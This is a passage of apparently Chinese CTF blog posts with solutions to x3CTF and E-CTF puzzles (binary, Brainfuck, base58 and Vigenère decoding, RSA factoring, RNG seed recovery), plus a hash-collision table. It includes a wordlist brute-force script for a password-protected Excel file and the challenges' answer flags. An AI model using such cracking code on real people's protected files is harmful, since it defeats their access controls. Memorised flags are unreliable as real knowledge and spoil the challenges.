range(0, len(binary_str), 8)] # Convert each 8-bit chunk to a character decoded_text = &#x27;&#x27;.join(chr(int(byte, 2)) for byte in bytes_list if len(byte) == 8) return decoded_text# Input stringc_1 = &quot;MVVVVMMMMMVVMMVVMVVMMMVVMVVVVMVVMVVM VMMV MV MVVVVVMVVMM VMM MMVVMMMV&quot;c_2 = &quot;MVVMM VMMMVVMVVVMMM VMMVVVMVVVMV MMM VMVVVVVMVVM VMVVMVVMVVVMMMVVMMMMMVVVMVVVM VMVVVVV&quot;c_3 = &quot;VMMMVVMMM VMMMVVMVVVVVM VMMV MMVVVMMMMMVVMMMVVMMVVMVVVVVM VMMM VMMVVMVVMMVVMMVVMMVVVM VMV MVVVMVVVVVM VM VM VMMVVMMV MMMVVMVVVVVMV MMMV MMVVMMMVVMVVM VMV MVVVMMMMMVVMMVVMMMVVMVVVVVM VMV MVVMVVMMVVMVVVM VMVVMVVM&quot;reversed_c_3 = c_3[::-1]c_4 = &quot;MMV MMVVMMMMMVVMMVVMMMVVMMVVVMVVMVVMMVVMMVVVVVM VMV MMVVVVMMV MMVVVMMM VMVVMMMVVVMVVM&quot;reversed_c_4 = c_4[::-1]c_5 = &quot;MMVVMMM VMVVMVVVMMVVMMVVVM VMVVVVVMVVMVVMMMMVVMMMMMVVMVVMMMVVVVVMV&quot;# mapping = &#123;&#x27;M&#x27;: &#x27;0&#x27;, &#x27;V&#x27;: &#x27;1&#x27;&#125;mapping1 = &#123;&#x27;M&#x27;: &#x27;1&#x27;, &#x27;V&#x27;: &#x27;0&#x27;&#125;mapping2 = &#123;&#x27;M&#x27;: &#x27;0&#x27;, &#x27;V&#x27;: &#x27;1&#x27;&#125;# print(decode_binary(c_1, mapping2)+decode_binary(c_2, mapping2) + decode_binary(c_3, mapping2) + decode_binary(c_4, mapping2) + decode_binary(c_5, mapping2) )print(decode_binary(c_1, mapping2)+decode_binary(c_2, mapping2) + decode_binary(reversed_c_3, mapping2) + decode_binary(reversed_c_4, mapping2) + decode_binary(c_5, mapping2) )# 输出结果：x3c&#123;i_d1dn&#x27;t_kn0w_mvm_c0uld_be_us3d_f0r_b1n4ry_3nc0d1ng_l0l&#125; 另外一个flag则是藏在右下角的勋章里： 人工将这些内容识别出来然后用base64进行解码即可。 内容大概为： 12345678910111213141516171819202122232425262728-----BEGIN CERTIFICATE-----MIIDyjCCAlCgAwIBAgISBKmF/S4TYSXpTzcor9eZJ/GrMAoGCCqGSM49BAMDMDIxCzAJBgNVBAYTAlVTMRYwFAYDVQQKEwlMZXQncyBFbmNyeXB0MQswOQYDVQQDEwJFNjAeFw0yNTAxMDYyMDM2MDFaFw0yNTA0MDYyMDM2MDBaMEAxPjA8BgNVBAMMNXgzY3ttdTV0X2IzX2Zlbl90eXAxbmdfdGgxcl9ieV9oNG5kXzEzNzUxMDUzMDQyNDgzNjF9MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAEcYu3flnEI2dttI5lQQmzRld72SDdBqCDtfto9pg5t/NFFIolkY8W8CryM9XlJEx3NAOGTgBoeUNTuWgiCseQeaOCAjYwggIyMA4GA1UdDwEB/wQEAwIHgDAdBgNVHSUEFjAUBggrBgEFBQcDAQYIKwYBBQUHAwIwDAYDVR0TAQH/BAIwADAdBgNVRQ4EFgQUrbtyF28hjw8oIqwXpakw8t7J9jQwHwYDVR0jBBgwFoAUkydGmAOpUWiOmNbEQkjbI79YlNIwVQYIKwYBBQUHAQEESTBHMCEGCCsGAQUFBzABhhVodHRwOi8vZTYuby5sZW5jci5vcmcwIgYIKwYBBQUHMAKGFmh0dHA6Ly91Ni5pLmxlbmNyLm9yZy8wQAYDVR0RBDkwN4IleDNje2llNXRfYjNfZnVuX3R5cDFuZl90aDFzX2J5X2g0bmRfMTM3NTEwNTMwNDI0ODM2MX0wEwYDVR0gBAwwCjAIBgZngQwBAgEwggEDBgorBgEEAdZ5AgQCBIH0BIHxAO8AdQB9WR4S4XggexxhZ3xe/fjQhlw0oE6VnrkDL9kOjC55uAAAAZQ9inTEAAAEAwBGMEQCIENpWRg98SQo5JdzyjgnyFeUY0WnNVzn5NkdDA3bzeKbAiBsAkk3fe5esm7A0efsLN/EyFjEK/NBGqYxgOucgZheQwB2ABNK3xglmEIjeAxv70x6kaQWtyNJzlhXat+u2qfCq+AiAAAB1D2KdXoAAAQDAEcwRQIgBfU4pkiNyNsl+I6skjXz6qqu+mNoI4JvtDsoYxoI+ZoCIQCRiMQSCEwahN0ImXu3cwDeyM+AbNeve0VgSLMSUBdxvTAKBggghkjOPQQDAwNoADBlAjEAvxa6nSpUMl7NuDB/+LJfzTskR498vLoetnZuHo14J6d9zuFRGQ8Dk4w2aQNsbuVsAjB9fE6GJYBiebb4aHu/J2amych3KP//D951/CdmiV5PKZqXWWdpaQZL+pbmsXRa8rM=-----END CERTIFICATE----- 会有一些误差，所以最后提交flag时需要多试几次。 foundations （Osint）：题目描述： 使用https://archive.org/来搜索这个比赛网站的历史纪录内容 可以在这里发现最早的纪录是在2024年7月14日： 点进去会发现： x3CTF{m4yb3_w3ll_m4ke_4_ch4ll3nge_0u7_0f_7h1s} mvm： 打开下载文件会得到 12MMVMVMVVMMVMVMVVMVMVVMVVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVVVVVMMMVMVMVVMMVVVVMMMVMVVVMVMMVVVVVMMMVMVVVMMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVVVMMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVVMMMVMVVMVMVMVVMVVMMVMVVMVMMVVVVVMMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVVVVMMMVMVVVMVMMVVVVVMMMVMVVMVMMVMVVVMMMVMVMVVMVMVVMVVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVVVVVMMMVMVMVVMMVVVVMMMVMVVVMVMMVVVVVMMMVMVMVVMMVMVVVMMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVVVMMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVVMMMVMVVMVMVMVVMVVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVVVVVMMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVVVVMMMVMVVVMVMMVVVVVMMMVMVVVMMMVMVMVVMVMVVMVVMMVMVVMVMMVMVVMVMMVMVVMVMMVVVVVMMMVMVMVVMMVMVMVVMMVVVVMMMVMVVVMVMMVVVVVMMMVMVMVVMMVMVMVVMMVMVVVMMMVVVVVMMMVMVVMVMVMVVMVVMMVMVVMVMMVMVVMVMMVMVVMVMMVVVVVMMMVMVMVVMMVVVVMMMVMVVVMVMMVVVVVMMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVVMMMVMVVMVMMVMVVMVMVMVVMVVMMVMVVMVMMVVVVVMMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVVVVMMMVMVVVMVMMVVVVVMMMVMVMVVMMVMVVVMMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVVVMMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVVVMMVMVVMVVMMVMVVMVMMVMVVMVMMVVVVVMMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVVVVMMMVMVVVMVMMVVVVVMMMVMVVVMMVMVVMVVMMVMVVMVMMVMVVMVMMVMVVMVMMVVVVVMMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVVVVMMMVMVVVMVMMVVVVVMMMVMVVVMMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVVVMMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVVVMMMVMVVMVMVMVVMVVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVVVVVMMMVMVMVVMMVVVVMMMVMVVVMVMMVVVVVMMMVMVVVMMMVVVVVMMMVMVVMVMVMVVMVVMMVMVVMVMMVMVVMVMMVMVVMVMMVVVVVMMMVMVMVVMMVVVVMMMVMVVVMVMMVVVVVMMMVMVVVMMMVMVVMVMVMVVMVVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVVVVVMMMVMVMVVMMVVVVMMMVMVVVMVMMVVVVVMMMVMVVMVMMVMVVVMMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVVVMMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVVMMMVMVVMVMMVMVVVMMMVMVMVVMMVMVMVVMVMVVMVVMMVMVVMVMMVVVVVMMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVVVVMMMVMVVVMVMMVVVVVMMMVMVMVVMMVMVVVMMVMVVMVVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVVVVVMMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVVVVMMMVMVVVMVMMVVVVVMMMVMVMVVMMVMVVVMMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVVVMMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVVMMMVVVVVMMMVMVVMVMMVMVVMVMVMVVMVVMMVMVVMVMMVMVVMVMMVVVVVMMMVMVMVVMMVMVMVVMMVMVMVVMMVVVVMMMVMVVVMVMMVVVVVMMMVMVVVM 跟之前一样，将其转成二进制再解码会得到 1++[----------&gt;+&lt;]&gt;.+++++++++.---------.-[-&gt;+++++&lt;]&gt;-.+[-----&gt;+&lt;]&gt;+.+++++++++.---------.-[----&gt;+++++&lt;]&gt;.+[---&gt;++&lt;]&gt;++.&gt;-[---&gt;+&lt;]&gt;---.--[-&gt;++++&lt;]&gt;+.++++++++.+++++.[--&gt;+++++++++&lt;]&gt;.[---&gt;+++++&lt;]&gt;.++++++++++.++++++++++++.-[-----&gt;+&lt;]&gt;.&gt;-[---&gt;+&lt;]&gt;.-[-----&gt;+&lt;]&gt;-.++++++++.------.-.++[-&gt;+++++&lt;]&gt;+.[-----&gt;++++&lt;]&gt;+.+++++++++.---------.&gt;--[--&gt;+++&lt;]&gt;. 很显然这是Brainfuck,所以找个在线的intepreter运行一下就可以得到flag： MVM{MVM_BRAIN_IS_FUCKED_MVM} count-the-mvms主要是数背景的mvm个数，发现它们的像素点是一样的。所以写个图像匹配脚本即可. 首先要把pdf转换成 png，推荐 adobe acrobat 123456789101112131415161718192021222324252627282930313233343536import cvlib# cvlib 是自己写的库im = cvlib.read_img(&quot;certificate_h4tum.png&quot;)sim = cvlib.subrectimg(im, 605, 516, 837, 665)sim2 = cvlib.subrectimg(sim, 44, 32, 79, 48)mvm = cvlib.subrectimg(sim2, 2, 2, 32, 13)print(&quot;read success&quot;)def match(im, x,y): if x+len(mvm) &gt; len(im): return False if y+len(mvm[0]) &gt; len(im[0]): return False for i in range(len(mvm)): for j in range(len(mvm[i])): [r,g,b] = mvm[i][j] [ri,gi,bi] = im[x+i][y+j] if r != ri or g != gi or b != bi: return False return True def count_matches(im): cnt = 0 for i in range(len(im)): print(i) for j in range(len(im[i])): if match(im, i,j): cnt += 1 j += len(mvm[0]) - 1 return cntprint(count_matches(im))print(&quot;finish&quot;) Cryptoman-vs-matrix:题目描述： 打开下载文件会看到： 1234567891011121314151617181920212223242526272829303132from sage.all import *from Crypto.Util.number import bytes_to_longclass RNG: def __init__(self, seed): self.p = next_prime(2**24) # 16777259 self.F = GF(self.p) self.M = matrix(self.F, 3,3, [bytes_to_long(seed[i:i+3]) for i in range(0, len(seed), 3)]) self.state = vector(self.F, map(ord, &quot;Mvm&quot;)) # [77, 118, 109] self.gen = self.F(2) def get_random_num(self): out = self.M * self.state for i in range(len(self.state)): # len = 3 self.state[i] = self.gen**self.state[i] return out * self.stateflag = b&quot;MVM&#123;???????????????????????????&#125;&quot;seed = flag[4:-1] # 27位，27/3=9rng = RNG(seed)samples = []for i in range(9): samples.append(rng.get_random_num())print(f&quot;&#123;samples = &#125;&quot;)# samples = [6192533, 82371, 86024, 4218430, 12259879, 16442850, 6736271, 7418630, 15483781] 是几个随机数的生成器（RNG），但生成逻辑非常简单。 每次会计算 (\\text{M} \\cdot \\text{state}) \\cdot \\text{new\\_state}(括号外的乘法是内积。在sage里，矩阵与矩阵/向量的乘法和向量与向量的内积都是用*)。并且有 \\text{new\\_state}[i] = 2^{\\text{state}[i]}.这里的初始state是已知的，所以我们只需要建立一个9元1次线性方程组即可。 我们可以写一段sagemath的代码来通过解方程逆推出matrix以及flag内容： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162p = 16777259 # = next_prime(2**24)F = GF(p)samples = [6192533, 82371, 86024, 4218430, 12259879, 16442850, 6736271, 7418630, 15483781]# 初始状态 S0 = [77, 118, 109]S0 = vector(F, [77, 118, 109])def next_state(st): return vector(F, [F(2)^int(x) for x in st])# 求出 S0 ~ S9S = [None]*10S[0] = S0for i in range(1, 10): S[i] = next_state(S[i-1])# 构造线性方程组 X * M_vec = YX = matrix(F, 9, 9)Y = vector(F, 9)for i in range(9): row_coeffs = [] # M_vec 的顺序: M[0,0], M[0,1], M[0,2], M[1,0], ..., M[2,2] for k in range(3): for j in range(3): row_coeffs.append(S[i][j] * S[i+1][k]) X[i] = row_coeffs Y[i] = samples[i]# 求解 9 个未知量M_vec = X.solve_right(Y)M_mat = matrix(F, 3, 3, M_vec)print(&quot;Recovered M =&quot;)print(M_mat)# 将 3x3 矩阵以行优先顺序（row-major）展开成 9 个元素# 对应当初 [bytes_to_long(seed[0:3]), bytes_to_long(seed[3:6]), ..., bytes_to_long(seed[24:27])]m_ints = []for i in range(3): for j in range(3): # Sage 返回的是 GF(p) 的元素，先转成普通整型 val = int(M_mat[i, j]) m_ints.append(val)# 将每个 val 转成 3 字节后依次拼接seed_recovered = b&quot;&quot;.join(val.to_bytes(3, &quot;big&quot;) for val in m_ints)# 最终还原 flag = b&quot;MVM&#123;&quot; + seed_recovered + b&quot;&#125;&quot;flag_recovered = b&quot;MVM&#123;&quot; + seed_recovered + b&quot;&#125;&quot;print(&quot;Recovered seed =&quot;, seed_recovered)print(&quot;Recovered flag =&quot;, flag_recovered)#最后得到的结果：# Recovered M =# [7090542 3355762 6252149]# [5137236 3223662 3497780]# [7484255 7174495 6698102]# Recovered seed = b&#x27;l1n34r_fuNcT10n5_4r3_my_f4v&#x27;# Recovered flag = b&#x27;MVM&#123;l1n34r_fuNcT10n5_4r3_my_f4v&#125;&#x27;","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/categories/CTF/"},{"name":"writeup","slug":"CTF/writeup","permalink":"https://archer-baiyi.github.io/categories/CTF/writeup/"}],"tags":[{"name":"writeup","slug":"writeup","permalink":"https://archer-baiyi.github.io/tags/writeup/"}]},{"title":"哈希加密的长度与碰撞情况","slug":"CTF/Crypto/哈希加密的长度与碰撞情况","date":"2025-03-09T18:36:57.000Z","updated":"2025-03-29T18:54:16.080Z","comments":true,"path":"2025/03/09/CTF/Crypto/哈希加密的长度与碰撞情况/","permalink":"https://archer-baiyi.github.io/2025/03/09/CTF/Crypto/%E5%93%88%E5%B8%8C%E5%8A%A0%E5%AF%86%E7%9A%84%E9%95%BF%E5%BA%A6%E4%B8%8E%E7%A2%B0%E6%92%9E%E6%83%85%E5%86%B5/","excerpt":"常见的哈希函数的长度及其碰撞情况汇总","text":"以下是各种常见的哈希函数的长度及其碰撞情况汇总： 哈希长度 (bit) 常见算法 碰撞情况 碰撞年份 发明年份 状态 128-bit MD5 存在已知有效碰撞攻击 2004 年 1992 年 已过时，不推荐使用 160-bit SHA-0, SHA-1, RIPEMD-160 SHA-0: 存在已知有效碰撞攻击 SHA-0: 2004 年 SHA-0: 1993 年 SHA-0: 已弃用，不推荐使用 SHA-1: 存在已知有效碰撞攻击 SHA-1: 2017 年 SHA-1: 1995 年 已过时，不推荐使用 256-bit SHA-256, SHA-3-256 暂无已知有效碰撞攻击 - SHA-256: 2001 年 安全，广泛使用 384-bit SHA-384 暂无已知有效碰撞攻击 - 2001 年 安全，高安全性需求 512-bit SHA-512, SHA-3-512 暂无已知有效碰撞攻击 - SHA-512: 2001 年 非常安全，高性能需求 碰撞情况说明 128-bit (MD5): MD5 是一种输出为 128 位的哈希算法，但由于其设计的安全性不足，早在 2004 年就被发现可以有效制造碰撞。 MD5 于 1992 年被发明，不适合任何需要密码学安全性的场景，仅可用于低安全性完整性校验。 160-bit (SHA-0, SHA-1, RIPEMD-160): SHA-0 是 SHA 系列的初代版本，存在严重的设计缺陷，在 2004 年被证明可以制造碰撞。SHA-0 于 1993 年发明。 SHA-1 作为输出 160 位的主流算法，在 2017 年被证实可以通过理论和实践攻击制造碰撞。SHA-1 于 1995 年发明。 RIPEMD-160 虽尚未有公开的碰撞记录，但不如更高位算法安全。 256-bit (SHA-256, SHA-3-256): 目前没有已知的碰撞攻击。 SHA-256 于 2001 年被发明，适合绝大多数场景，如数字签名、区块链和数据完整性验证。 384-bit (SHA-384): 为高安全需求设计，未有任何已知的碰撞攻击。 SHA-384 于 2001 年发明，适用于密钥交换、长时间数据存储等高安全性应用。 512-bit (SHA-512, SHA-3-512): 提供极高的安全性，特别适用于对抗潜在的量子计算威胁。 SHA-512 于 2001 年发明，性能消耗较高，适合长期存储的场景。","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/categories/CTF/"},{"name":"Crypto","slug":"CTF/Crypto","permalink":"https://archer-baiyi.github.io/categories/CTF/Crypto/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/tags/CTF/"},{"name":"哈希","slug":"哈希","permalink":"https://archer-baiyi.github.io/tags/%E5%93%88%E5%B8%8C/"},{"name":"Hash","slug":"Hash","permalink":"https://archer-baiyi.github.io/tags/Hash/"}]},{"title":"E-CTF比赛 Writeup","slug":"CTF/Writeup/E-CTF-Writeup","date":"2025-03-02T23:17:07.000Z","updated":"2025-03-25T19:31:29.228Z","comments":true,"path":"2025/03/03/CTF/Writeup/E-CTF-Writeup/","permalink":"https://archer-baiyi.github.io/2025/03/03/CTF/Writeup/E-CTF-Writeup/","excerpt":"E-CTF比赛的题解，涉及方向：Crypto, Web, Steg, Misc, Forensics, Osint","text":"1. Cryptography（密码学）ASCII me anything but not the flag 根据它的提示，我们先将这段内容用ASCII解码，得到： 123456789108 100 111 109 123 85 99 49 122 95 106 53 95 79 111 51 95 88 52 116 95 48 109 95 51 111 88 121 90 107 97 106 48 105 125 10 10 69 98 111 98 32 102 112 32 118 108 114 111 32 104 98 118 44 32 100 108 108 97 32 105 114 122 104 32 58 32 72 66 86 72 66 86 10 10 87 101 108 108 32 100 111 110 101 44 32 98 117 116 32 110 111 119 32 100 111 32 121 111 117 32 107 110 111 119 32 97 98 111 117 116 32 116 104 101 32 103 117 121 32 119 104 111 32 103 111 116 32 115 116 97 98 98 101 100 32 50 51 32 116 105 109 101 115 32 63-&gt;ldom&#123;Uc1z_j5_Oo3_X4t_0m_3oXyZkaj0i&#125;Ebob fp vlro hbv, dlla irzh : HBVHBVWell done, but now do you know about the guy who got stabbed 23 times ? 第三段的指的是凯撒大帝被刺杀的事件： 所以我们尝试遍历前两段的凯撒加密结果，但只有第二段可以得到有用信息： 1Here is your key, good luck : KEYKEY 可以得知密钥为：”HBVHBV“（我一开始以为密码就是KEYKEY）。由于第一段括号前的内容为4个字母，刚好对的上”ectf“，所以应该是单表或者多表替换加密。再因为密钥为重复的内容，不难猜测这应该是“Vigenere 维吉尼亚密码”。于是找个在线的解密网页（https://planetcalc.com/2468/#google_vignette）便可以得到flag： 1ectf&#123;th1s_i5_th3_w4y_0f_3ncrypti0n&#125; OIIAIOIIIAI 😼 由于知道这次比赛的flag格式为ectf{}，所以不难发现这串字符的偶数位应该是flag的开头，也就是： 1ectf&#123;y0U_5p1N_M3 而由于}在字符串开头，所以猜测基数位的倒序为flag的后半部分： 1R1GhT_R0unD_B4bY&#125; 拼在一起得到flag： 1ectf&#123;y0U_5p1N_M3_R1GhT_R0unD_B4bY&#125; Hashes Binder 首先会下载得到3个文件： 由于这份Excel文件被设置了密码保护，所以我们尝试用这个wordlist里的内容来爆破它： 1234567891011121314151617181920212223import msoffcryptoimport ioencrypted_file = &quot;parts.xlsx&quot; password_list = &quot;wordlist.txt&quot; with open(password_list, &quot;r&quot;, encoding=&quot;utf-8&quot;) as f: passwords = [line.strip() for line in f.readlines()]for password in passwords: try: with open(encrypted_file, &quot;rb&quot;) as file: office_file = msoffcrypto.OfficeFile(file) office_file.load_key(password=password) decrypted_file = io.BytesIO() office_file.decrypt(decrypted_file) print(f&quot;成功破解密码: &#123;password&#125;&quot;) break except Exception: continue# 成功破解密码: dolphin 打开Excel文件后会看到3部分内容 123456789Part 1036074c2585230c1ad9e6b654a1671ac13ee856eb505f44346593e1748a6a52aPart 22H8ZcpmQyRisnPart 3cHJlc2NyaXB0aW9u 首先注意到第2，3部分非常像base64编码内容，于是尝试解码，第三部分会成功解出来： 1prescription 第二部分则提示解码失败，所以我们尝试其他base解码，最后用base58成功解码得到： 1digestive 第一部分则非常像哈希加密的结果，所以我们用这个网站试一下能不能破解 https://hashes.com/en/decrypt/hash 提示破解成功，原文为spooky，并且使用的算法是Gost Hash。（spooky其实也在这个wordlist.txt里，所以理论上来说这一步也可以用爆破得到。） 于是用 1dolphin_spooky_digestive_prescription 成功解压.zip压缩包得到flag： 1ECTF&#123;J0nH_tH3_Cr4ck3R_95234826&#125; RSA intro 这道题我们会得到以下内容： 1234n = 1184757578872726401875541948122658312538049254193811194706693679652903378440466755792536161053191231432973156335040510349121778456628168943028766026325269453310699198719079556693102485413885649073042144349442001704335216057511775363148519784811675479570531670763418634378774880394019792620389776531074083392140830437849497447329664549296428813777546855940919082901504207170768426813757805483319503728328687467699567371168782338826298888423104758901089557046371665629255777197328691825066749074347103563098441361558833400318385188377678083115037778182654607468940072820501076215527837271902427707151244226579090790964814802124666768804586924537209470827885832840263287617652116022064863681106011820233657970964986092799261540575771674176693421056457946384672759579487892764356140012868139174882562700663398653410810939857286089056807943991134484292518274473171647231470366805379774254724269612848224383658855657086251162811678080812135302264683778545807214278668333366983221748107612374568726991332801566415332661851729896598399859186545014999769601615937310266497300349207439222706313193098254004197684614395013043216709335205659801602035088735521560206321305834999363607988482888525092210585343868702766655032190348593070756595867719633492847013620378010952424253098519859359544101947494405255181048550165119679168071637363387551385352023888031983210940358096667928019837327581681936262186049576626435407253113152851511562799379477905913074052917135254673527350886619693800827592241738185465519368503599267554966329609741719839452532720121891782656000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001e = 65537c = 393830705821083872264416484945379590743951209334251680140561629963083955435155434968501995173717065691853716117413549060471633713246813706134614822460487831949312719410922980049951577395596254279195364667821988767675462852220254638390252652391863031378262058213973374365653466528787640726441241664538814924465041415751207617994829099967542528845558372954608772395722055861369383117996161988362298650918468621344968162697585757444815069821774651095279049590140325395770490299618719676066106689396243767847620065054763147901166291755102218540290732819710294120101688593205036339603152228827861450774360237006971191234350634731104643779249017990427055169232234892324512234471025984131134122883594190002695857381320761826426970820621555957081409595866374650139218172798735536295519361258955868218458841069870611367807353745731928726480481254620623949030522228724677423429285228917983167742866068764059333196595815029550909470984427785123479796787934189869159245455191142352654087327876642690754428041545205764160668875253155015956045237338532248073834631989395905208181116526111301051883717335829373670674970007067708289628731972707477338551521585672558157829354894929466723788269911067380887281008564055766243843557738727000164255990684153972958815292767702154995098383096546576559199090417518282978657504210433584144451378874050676287588884988934683793378300065910040270282398699691108573435112129408980056605713259535036581461672565785674329469547540861581715756111296028940885214170609934085009608200810707122173370006290459841638659407675519141544675968270051746963709729460531469035621873301953785282870733516854080405064440750450304537433849449545664331761838457477121677018421695909336075840076436991397964264703526101810961378256559625011198775706699 因为没有其他信息了，所以我们先用 http://www.factordb.com/index.php 试一下暴力分解n： 成功得到n的其中一个因数为5054843。之后就只需要写一段代码解密就可以得到flag： 123456789101112131415from Crypto.Util.number import inverse, long_to_bytesdef rsa_decrypt(n, e, c, p): q = n // p phi_n = (p - 1) * (q - 1) d = inverse(e, phi_n) m = pow(c, d, n) return long_to_bytes(m).decode(&#x27;utf-8&#x27;)n = e = 65537c = p = 5054843 plaintext = rsa_decrypt(n, e, c, p)print(&quot;解密结果:&quot;, plaintext)# 解密结果: ectf&#123;b4sic_F4cT0rDb_rS4&#125; Cracking the Vault 这道题我们会得到2份文件，一份是python的代码，关于加密算法的，另一份文件则是加密后的结果。 我们首先来看一下加密的具体过程： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647import secretsimport hashlibdef encryption(text): encrypted = [] random = secrets.SystemRandom() padding_length = 256 - len(text) % 256 raw_padding = [chr(random.randint(32, 126)) for _ in range(padding_length)] scrambled_padding = [chr((ord(c) * 3 + 7) % 94 + 32) for c in raw_padding] shifted_padding = scrambled_padding[::-1] padded_text = &#x27;&#x27;.join(shifted_padding) + text final_padded_text = &#x27;&#x27;.join( chr((ord(c) ^ 42) % 94 + 32) if i % 2 == 0 else c for i, c in enumerate(padded_text) ) secret_key = str(sum(ord(c) for c in text)) secret_key = secret_key[::-1] hashed_key = hashlib.sha256(secret_key.encode()).hexdigest() seed = int(hashed_key[:16], 16) random = secrets.SystemRandom(seed) for i, char in enumerate(text): char_code = ord(char) shift = (i + 1) * 3 transformed = (char_code + shift + 67) % 256 encrypted.append(chr(transformed)) return &#x27;&#x27;.join(encrypted), seedwith open(&#x27;VaultKey.txt&#x27;, &#x27;r&#x27;) as f: text = f.read()encrypted_text, seed = encryption(text)with open(&#x27;VaultKey_encrypted.txt&#x27;, &#x27;w&#x27;) as f: f.write(encrypted_text)print(&quot;The file has been successfully encrypted!&quot;) 我们可以注意到这段代码里有很多多余的内容（指没有真正出现在加密过程中），真正跟加密算法相关的其实只有这一段 1234567for i, char in enumerate(text): char_code = ord(char) shift = (i + 1) * 3 transformed = (char_code + shift + 67) % 256 encrypted.append(chr(transformed)) return &#x27;&#x27;.join(encrypted), seed 所以我们只需要逆向一下这个加密逻辑便可以得到flag： 123456789101112131415def decryption(encrypted_text): decrypted_chars = [] for i, enc_char in enumerate(encrypted_text): enc_code = ord(enc_char) shift = 3 * (i + 1) + 67 orig_code = (enc_code - shift) % 256 decrypted_chars.append(chr(orig_code)) return &#x27;&#x27;.join(decrypted_chars)with open(&#x27;VaultKey_encrypted.txt&#x27;, &#x27;r&#x27;, encoding=&#x27;utf-8&#x27;, errors=&#x27;ignore&#x27;) as f: encrypted_text = f.read()print(decryption(encrypted_text))# Well done! I bet you&#x27;re great at math. Here&#x27;s your flag, buddy: ectf&#123;1t_W45_ju5T_4_m1nu5&#125; Never two without three 我们首先会得到这些内容： 1AEBvoE14n2JjDEhaEO5eAGnEFGdXluF2FNJxC01jXNPQX3PVl3T5oOm4DQrVXFXJGDBxEudVC3E5Xuh0oFzY 直接尝试base64解码会提示失败，所以根据它的提示我们先遍历它的所有凯撒加密然后再解码： 12345678910111213141516171819202122232425262728293031import base64import stringdef caesar_cipher_decrypt(text, shift): decrypted_text = &quot;&quot; for char in text: if char in string.ascii_letters: is_upper = char.isupper() alphabet = string.ascii_uppercase if is_upper else string.ascii_lowercase new_index = (alphabet.index(char) - shift) % 26 decrypted_text += alphabet[new_index] else: decrypted_text += char return decrypted_textdef try_base64_decode(text): try: decoded_data = base64.b64decode(text).decode(&#x27;utf-8&#x27;) return decoded_data except Exception: return Nonecipher_text = &quot;AEBvoE14n2JjDEhaEO5eAGnEFGdXluF2FNJxC01jXNPQX3PVl3T5oOm4DQrVXFXJGDBxEudVC3E5Xuh0oFzY&quot;for shift in range(26): decrypted_text = caesar_cipher_decrypt(cipher_text, shift) base64_decoded = try_base64_decode(decrypted_text) if base64_decoded: print(f&quot;Shift: &#123;shift&#125;, 解码: &#123;base64_decoded&#125;&quot;)# Shift: 10, 解码: ADeyMxwfsMLjPNnAgTUkMnEvT6gKMs41F7qKoryxG8LhK5SYY4gRKKKu96LtyZN 发现这是唯一可以成功解码出来的内容。我们再次尝试用base64解码这段内容会提示失败，所以还是转战其他的base编码，最后再次用base58成功解码得到： 1The flag is: ectf&#123;D0_u_l0v3_t4e_crypt0grap413&#125; 2. WebJava Weak Token 先简单科普一下JWT： JWT是一串base64编码，被用.分成3部分。第一部分是header，里面会写使用的算法以及typ（一般都是JWT）。第二部分是Payload，是JWT的核心内容，通常会纪录当前JWT所有者的身份信息。第三部分则是签名，会计算 